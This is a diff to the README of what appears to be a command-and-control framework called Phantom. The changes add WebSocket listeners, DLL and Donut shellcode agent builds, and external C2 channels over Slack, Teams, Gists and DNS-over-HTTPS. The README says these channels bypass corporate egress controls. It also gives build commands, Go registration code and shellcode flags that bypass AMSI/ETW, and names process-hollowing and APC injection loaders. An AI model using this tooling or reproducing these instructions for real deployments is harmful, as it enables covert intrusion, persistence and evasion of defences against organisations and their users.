@@ -38,7 +38,7 @@
 ### Agent Management — Status, OS, IP, Interact
 ![Agents](docs/screenshots/dash1.jpg)
 
-### Listener Management — HTTP/HTTPS, Presets, Create & Start
+### Listener Management — HTTP/HTTPS/WebSocket, Presets, Create & Start
 ![Listeners](docs/screenshots/dash2.jpg)
 
 ### Terminal — .NET Assembly, Quick Actions, File Upload
@@ -80,7 +80,7 @@
 - **Keyboard shortcuts** — Alt+1-9 tab switching, `/` to focus terminal
 
 **Communications**
-- **HTTP/HTTPS/DNS/TCP/SMB listeners** with malleable communication profiles
+- **HTTP/HTTPS/WS/WSS/DNS/TCP/SMB listeners** with malleable communication profiles
 - **Encrypted comms** — RSA-2048 key exchange + AES-256-GCM with auto key rotation
 - **4 malleable profiles** — Default, Microsoft 365, Cloudflare Workers, Redirector
 - **SMB/TCP pivoting** — agent-to-agent relay for lateral access (TCP works cross-platform; SMB requires Windows)
@@ -601,7 +601,9 @@ make agent-windows       # Cross-compile Windows/amd64 agent
 make agent-linux         # Cross-compile Linux/amd64 agent
 make agent-darwin        # Cross-compile macOS/amd64 agent
 make agent-garble-windows # Obfuscated Windows agent via garble
-make agent-all           # Build all agent variants (Windows + Linux + macOS + DLL)
+make agent-dll           # Cross-compile Windows DLL agent (rundll32/regsvr32/sideload)
+make agent-shellcode     # Generate PIC shellcode (.bin) from Windows agent via Donut
+make agent-all           # Build all agent variants (Windows + Linux + macOS + DLL + shellcode if donut installed)
 make keygen              # Generate RSA keypair for server
 make certs               # Generate self-signed TLS certificates
 make deps                # Install dependencies (Go modules + garble)
@@ -766,6 +768,94 @@ curl -X POST http://localhost:3000/api/payload/backdoor/binary \
 ```
 
 Supported backdoor types: DLL sideloading, LNK shortcuts, installer wrappers, service DLLs, registry persistence, scheduled tasks, WMI events (fileless), Office templates, startup folder, Linux bashrc.
+
+---
+
+## External C2 (ExC2) Channels
+
+Phantom supports a plugin interface for third-party transport modules. ExC2 channels allow agents to receive tasks via services like Slack, Microsoft Teams, GitHub Gists, and DNS-over-HTTPS — transports that often bypass corporate egress controls blocking direct HTTP/HTTPS.
+
+### CLI Commands
+
+```
+phantom > exchannel list                  # List registered channels + status
+phantom > exchannel start slack           # Start polling a channel
+phantom > exchannel stop slack            # Stop a channel
+```
+
+### Web UI API
+
+```
+GET  /api/exchannel/list           — list all channels with running status
+POST /api/exchannel/start          — body: {"name":"slack"}
+POST /api/exchannel/stop           — body: {"name":"slack"}
+```
+
+### Registering a Slack ExC2 Channel (PoC)
+
+```go
+import "github.com/phantom-c2/phantom/internal/exchannel"
+
+ch := exchannel.NewSlackChannel(
+    "xoxb-your-bot-token",         // Slack bot token
+    "C0123456789",                  // Slack channel ID
+    "https://hooks.slack.com/...",  // Incoming webhook (optional)
+)
+srv.RegisterExChannel(ch)
+```
+
+**Message format used by agents:** `[PHANTOM:<agentID>:<base64-payload>]`
+
+**Setup:** Create a Slack app at api.slack.com/apps with `chat:write` and `channels:history` bot scopes, install to workspace, and invite the bot to a private channel.
+
+### Implementing Custom Channels
+
+Any struct implementing `exchannel.Channel` can be registered:
+
+```go
+type Channel interface {
+    Name() string
+    Start(ctx context.Context) error
+    Stop() error
+    Send(agentID string, payload []byte) error
+    Recv(ctx context.Context) (agentID string, payload []byte, err error)
+    IsRunning() bool
+}
+```
+
+---
+
+## Donut Shellcode Generation
+
+Convert the Windows agent EXE to position-independent shellcode (PIC) for process injection without touching disk.
+
+### Prerequisites
+
+```bash
+go install github.com/wabzsy/gonut/cmd/donut@latest
+# or: pip3 install donut-shellcode
+```
+
+### Generate via Make
+
+```bash
+make agent-shellcode LISTENER_URL=https://your-c2.com:443
+# Output: build/agents/phantom-agent_windows_amd64.bin
+# Flags: -a 2 (x64)  -b 1 (bypass AMSI/ETW)  -e 3 (entropy)  -z 2 (aPLib compress)
+```
+
+### Generate via Web UI / API
+
+`POST /api/payload/shellcode` — body: `{"arch": "x64"}`. Requires the Windows EXE to be built first.
+
+### Programmatic
+
+```go
+result, err := payloads.GenerateShellcodeFromAgent("build")
+// result.Path → "build/agents/phantom-agent_windows_amd64.bin"
+```
+
+Compatible with PhantomImplant loaders (VirtualAlloc+CreateThread, process hollowing, Early Bird APC).
 
 ---
 
